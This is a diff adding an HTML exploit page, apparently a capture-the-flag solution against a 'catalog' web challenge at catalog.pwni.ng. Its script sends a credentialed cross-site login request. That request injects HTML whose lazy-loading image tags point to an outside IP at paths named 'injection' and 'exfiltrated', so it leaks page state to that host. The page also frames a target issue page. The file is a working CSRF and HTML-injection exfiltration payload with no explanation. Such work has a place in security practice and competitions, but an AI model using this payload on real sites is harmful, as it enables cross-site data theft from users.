@@ -1,0 +1,29 @@
+<html>
+    <head>
+        <title>Psst! Get out of here...</title>
+        <script>
+            const next = async () => {
+                let res  = await fetch("/status");
+                let status = await res.text();
+                if (status === "true") {
+                    await fetch("http://catalog.pwni.ng/user.php", {
+                        "headers": {
+                            "content-type": "application/x-www-form-urlencoded",
+                        },
+                        "body": `username="/><img src="http://106.14.153.173/injection"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><div align="left"><img src="http://106.14.153.173/exfiltrated" loading="lazy"></div><em>&password=1&action=login`,
+                        "method": "POST",
+                        "mode": "no-cors",
+                        "credentials": "include"
+                    });
+                    await fetch("/unlock");
+                } else {
+                    next();
+                }
+            }
+            next();
+        </script>
+    </head>
+    <body>
+        <iframe src="http://catalog.pwni.ng/issue.php?id=19900" style="position: absolute; width: 400%; height: 500px; border: 0"></iframe>
+    </body>
+</html>
